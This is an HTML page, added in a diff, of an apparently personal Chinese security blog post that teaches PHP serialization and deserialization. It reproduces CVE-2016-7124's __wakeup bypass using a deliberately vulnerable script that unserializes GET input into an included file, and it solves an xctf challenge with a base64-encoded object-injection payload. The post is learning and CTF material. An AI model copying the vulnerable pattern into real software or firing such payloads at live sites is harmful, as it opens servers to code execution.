@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>反序列化的学习 | y0lo&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="php的序列号与反序列化0X00 序列化serialize()函数将一个对象转换为字符串形式 我们来看一下直接输出对象是什么效果的： 12345678&lt;?php	class test&amp;#123;	public $name&#x3D;&quot;ghtwf01&quot;;	public $age&#x3D;&quot;18&quot;;	&amp;#125;	$a&#x3D;new test();	print_r($a);?&amp;g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化的学习">
+<meta property="og:url" content="http://example.com/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="y0lo&#39;s blogs">
+<meta property="og:description" content="php的序列号与反序列化0X00 序列化serialize()函数将一个对象转换为字符串形式 我们来看一下直接输出对象是什么效果的： 12345678&lt;?php	class test&amp;#123;	public $name&#x3D;&quot;ghtwf01&quot;;	public $age&#x3D;&quot;18&quot;;	&amp;#125;	$a&#x3D;new test();	print_r($a);?&amp;g">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/image-20201025114330014.png">
+<meta property="og:image" content="http://example.com/image-20201025115202868.png">
+<meta property="og:image" content="http://example.com/image-20201025142546176.png">
+<meta property="og:image" content="http://example.com/image-20201025143701471.png">
+<meta property="og:image" content="http://example.com/image-20201025144356849.png">
+<meta property="og:image" content="http://example.com/image-20201025152734105.png">
+<meta property="og:image" content="http://example.com/image-20201025153757010.png">
+<meta property="og:image" content="http://example.com/image-20201025153925448.png">
+<meta property="article:published_time" content="2020-10-24T13:59:38.000Z">
+<meta property="article:modified_time" content="2021-05-28T05:05:10.660Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image-20201025114330014.png">
+  
+    <link rel="alternate" href="/atom.xml" title="y0lo's blogs" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">y0lo&#39;s blogs</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-反序列化的学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time class="dt-published" datetime="2020-10-24T13:59:38.000Z" itemprop="datePublished">2020-10-24</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/security/">security</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      反序列化的学习
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="php的序列号与反序列化"><a href="#php的序列号与反序列化" class="headerlink" title="php的序列号与反序列化"></a>php的序列号与反序列化</h1><h2 id="0X00-序列化"><a href="#0X00-序列化" class="headerlink" title="0X00 序列化"></a>0X00 序列化</h2><p>serialize()函数将一个对象转换为字符串形式</p>
+<p>我们来看一下直接输出对象是什么效果的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p><img src="/image-20201025114330014.png" alt="image-20201025114330014"></p>
+<span id="more"></span>
+
+<p>这个时候我们利用serialize()函数将这个对象进行序列化成字符串然后输出，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line">	<span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p><img src="/image-20201025115202868.png" alt="image-20201025115202868"></p>
+<p>如果不是public方法那么后面的读取方法就有点不一样，例如代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sex</span>=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line">	<span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下 ：</p>
+<p><img src="/image-20201025142546176.png" alt="image-20201025142546176"></p>
+<p>private分析：</p>
+<p>这样就发现本来是age结果上面出现的是testage，而且testage长度为7，但是上面显示的是9。</p>
+<p>查找资料后发现private属性序列化的时候格式是%00类名%00成员名，%00占一个字节长度，所以age加了类名后变成了testage长度为9。</p>
+<p>protect分析：</p>
+<p>本来是sex结果上面出现的是*sex，而且*sex的长度是4，但是上面显示的6。</p>
+<p>查找资料后发现protect属性序列化的时候格式是%00%00成员名</p>
+<p>这里介绍一下public、private、protect的区别</p>
+<p><img src="/image-20201025143701471.png" alt="image-20201025143701471"></p>
+<h2 id="0X01-反序列化"><a href="#0X01-反序列化" class="headerlink" title="0X01 反序列化"></a>0X01 反序列化</h2><p>定义：反序列化就是利用unseralize()函数将一个经过序列化的字符串还原成php代码形式。</p>
+<p>代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&quot;序列化字符串&quot;</span>;</span><br><span class="line">	<span class="variable">$b</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0X02-反序列化漏洞原理"><a href="#0X02-反序列化漏洞原理" class="headerlink" title="0X02 反序列化漏洞原理"></a>0X02 反序列化漏洞原理</h2><p>到这儿也许大家会想着序列化过去再反序列化回来，不就是形式之间的转换吗，和漏洞有什么关系？</p>
+<p>这里先掌握php常见的魔术方法，先列出几个最常见的魔术方法。</p>
+<p><img src="/image-20201025144356849.png" alt="image-20201025144356849"></p>
+<h3 id="CVE-2016-7124-wakeup绕过"><a href="#CVE-2016-7124-wakeup绕过" class="headerlink" title="CVE-2016-7124 __wakeup绕过"></a>CVE-2016-7124 __wakeup绕过</h3><h4 id="wakeup-魔法函数简介"><a href="#wakeup-魔法函数简介" class="headerlink" title="__wakeup 魔法函数简介"></a>__wakeup 魔法函数简介</h4><p>unserialize()会检查是否存在一个 __wakeup()方法。如果存在，则会先调用 __wakeup()方法，预先准备对象需要的资源。</p>
+<p>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。</p>
+<p><strong>漏洞影响版本</strong></p>
+<p>php5&lt;5.6.25</p>
+<p>php7&lt;7.0.10</p>
+<p><strong>漏洞复现</strong></p>
+<p>代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> <span class="variable">$target</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    		<span class="variable language_">$this</span>-&gt;target=<span class="string">&quot;wakeup!&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  			<span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;D:\ProgramFiles\PHPTutorial\WWW\zx\hello.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        	<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,<span class="variable language_">$this</span>-&gt;target);</span><br><span class="line">        	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">	<span class="variable">$b</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;hello.php&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;./hello.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>魔法函数__wakeup()要比__destruct()先执行，所以我们传入</p>
+<p>O:1:”A”:1:{s:6:”target”;s:18:”<?php phpinfo();?>‘’;}</p>
+<p>时会被先执行的__wakeup()函数$target赋值覆盖为wakeup!，然后生成的hello.php里面的内容就是wakeup！</p>
+<p>传入?test&#x3D;O:1:”A”:1:{s:6:”target”;s:18:”<?php phpinfo();?>‘’;}</p>
+<p>会返回：<br>hello.php</p>
+<p>wakeup!</p>
+<p>现在我们根据绕过方法：对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行，对象个数原来是1我们将其改为2，也就是</p>
+<p>?test&#x3D;O:1:”A”:2:{s:6:”target”;s:18:”<?php phpinfo();?>‘’;}</p>
+<p>就能实现绕过。</p>
+<h2 id="0X03-xctf-Web-php-unserialize"><a href="#0X03-xctf-Web-php-unserialize" class="headerlink" title="0X03 xctf Web_php_unserialize"></a>0X03 xctf Web_php_unserialize</h2><p><img src="/image-20201025152734105.png" alt="image-20201025152734105"></p>
+<p>构造payload：?var&#x3D;O:4:”Demo”:2:{s:10:”%00Demo%00file”;s:8:”f14g.php”}</p>
+<p>先把%00进行一次url解码：</p>
+<p><img src="/image-20201025153757010.png" alt="image-20201025153757010"></p>
+<p>然后进行一次base64编码得到payload：</p>
+<p>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</p>
+<p><img src="/image-20201025153925448.png" alt="image-20201025153925448"></p>
+<p>拿下flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="cl09mim38000m1kvj2j2la1yz" data-title="反序列化的学习" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/10/31/ThinkPHP5-x-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ThinkPHP5.x 远程命令执行漏洞分析与复现
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/31/msf%E7%9A%84%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">msf的基础用法</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/misc/">misc</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">注入</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/">Security的学习&#39;</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/10/%E6%B5%85%E8%B0%88nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/">[VNCTF2021]realezjvav复现</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/">Python学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
